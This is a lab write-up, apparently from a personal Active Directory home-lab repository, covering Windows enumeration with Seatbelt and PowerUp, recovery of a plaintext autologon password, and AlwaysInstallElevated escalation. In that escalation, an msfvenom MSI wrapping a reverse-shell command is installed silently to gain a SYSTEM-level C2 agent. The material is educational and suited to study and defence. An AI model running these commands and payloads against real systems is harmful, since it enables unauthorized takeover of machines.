# 2. Enumerating machine, Privilege Escalation, and Local Persistence

## Local Enumeration:

- We can use Covenant seatbelt module to enumerate all local information.

```powershell
[07/24/2023 13:16:23 UTC] Seatbelt completed

(singhx) > Seatbelt -group=all
====== AMSIProviders ======


  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}

  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23050.5-0\MpOav.dll"



====== AntiVirus ======


  Engine                         : Windows Defender

  ProductEXE                     : windowsdefender://

  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe



====== AppLocker ======


  [*] AppIDSvc service is Stopped


    [*] Applocker is not running because the AppIDSvc is not running

---------------------------snip------------------------------

====== WMIFilterBinding ======


  Consumer                       : __EventFilter.Name="SCM Event Log Filter"

  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"

  CreatorSID                     : S-1-5-32-544



====== WSUS ======


  UseWUServer                    : False

  Server                         : 

  AlternateServer                : 

  StatisticsServer               : 

[*] Completed collection in 7.957 seconds
```

## Autologon Misconfiguration:

- We will now import powerUp.ps1 script using covenant PowerShellImport command.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/044ffa8e-c19b-47f8-b624-07800b6f7702)

- After importing is done we will send the command `powershell invoke-allchecks`

```powershell
[07/24/2023 12:59:55 UTC] PowerShell completed

(singhx) > powershell invoke-allchecks


[*] Running Invoke-AllChecks



--------------snip-----------------



DefaultDomainName    : mayorsec

DefaultUserName      : s.chisholm

DefaultPassword      : FallOutBoy1!

AltDefaultDomainName : 

AltDefaultUserName   : 

AltDefaultPassword   : 



[*] Checking for modifidable registry autoruns and configs...



```

- Here we got autologin credentials. The same we can achieve with SeatBelt in Covenant.

```powershell
[07/24/2023 13:10:31 UTC] Seatbelt completed

(singhx) > Seatbelt WindowsAutoLogon



====== WindowsAutoLogon ======


  DefaultDomainName              : mayorsec

  DefaultUserName                : s.chisholm

  DefaultPassword                : FallOutBoy1!

  AltDefaultDomainName           : 

  AltDefaultUserName             : 

  AltDefaultPassword             : 


[*] Completed collection in 0.024 seconds
```

## AlwaysInstalledElevated Misconfiguration:

- To reveal the misconfiguration of AlwaysInstallElevated we can use Covenant's built-in tool called SharpUp audit.

```powershell
[07/24/2023 13:32:06 UTC] SharpUp completed

(singhx) > SharpUp audit

=== SharpUp: Running Privilege Escalation Checks ===

=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1

  HKCU:    1
```
- We can achieve the same using PowerUp.ps1
- For this, we need to import PowerUp.ps1 and run the command `powershell invoke-allchecks`

```powershell
07/24/2023 15:21:44 UTC] PowerShell completed

(singhx) > powershell invoke-allchecks


[*] Running Invoke-AllChecks

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI

```
- In order to abuse this feature, we need to generate a malicious payload using msfvenom.
- In cmd use reverse shell encoded command using covenant.

  ![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/b1a8d3ff-53b2-4023-920f-68f5c1987843)

```bash
└─$ msfvenom -p windows/exec CMD="<powershell cmd>" -f msi -o installer.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 449 bytes
Final size of msi file: 159744 bytes
Saved as: installer.msi
```

- Using the Covenant upload function we will upload generated malicious file to our target.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/6f67f5ce-c269-44d9-b308-8da78df23959)

- Change the working directory in Covenant to Public.

``` powershell
[07/24/2023 15:34:44 UTC] ChangeDirectory completed

(singhx) > ChangeDirectory C:\Users\Public\

C:\Users\Public

[07/24/2023 15:34:52 UTC] ListDirectory completed

(singhx) > ListDirectory

Name                             Length  CreationTimeUtc       LastAccessTimeUtc     LastWriteTimeUtc

----                             ------  ---------------       -----------------     ----------------
C:\Users\Public\desktop.ini      174     12/7/2019 9:14:54 AM  7/24/2023 3:34:22 PM  12/7/2019 9:12:42 AM

C:\Users\Public\Installer,msi    159744  7/24/2023 3:34:22 PM  7/24/2023 3:34:22 PM  7/24/2023 3:34:22 PM
```

- Next step is to run the uploaded file using cmd: `shell msiexec /quiet /qn /i installer.msi` in Covenant.

``` powershell
[07/24/2023 15:53:00 UTC] Shell completed

(singhx) > shell msiexec /quiet /qn /i Installer.msi
```
- We got another Grunts running.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/7682c014-46f4-41c8-b9d4-2a4ba9cc4038)

- On interacting with the latest Grunts we get the user as System.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/c698141c-8ec1-4929-b08b-b878f4fe463d)
